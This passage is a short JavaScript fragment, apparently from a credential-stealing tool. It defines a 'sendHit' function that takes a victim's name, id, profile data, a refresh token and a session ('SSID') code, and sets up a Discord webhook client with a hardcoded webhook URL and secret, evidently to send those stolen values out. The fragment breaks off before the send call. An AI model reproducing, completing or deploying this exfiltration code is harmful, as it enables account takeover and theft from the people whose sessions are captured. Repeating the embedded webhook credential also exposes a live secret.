...
const sendHit = async (name, id, firstProfileData, refresh, SSIDCode) => {
  const webhookClient = new WebhookClient({ url: 'https://discord.com/api/webhooks/1249648912873291816/8lqa_YuytdYN29fUHIjhKMx8E8zhGh_GGQf4tJWwcTfXidDNWyrp7YTUpP-v8yE04C7U' });
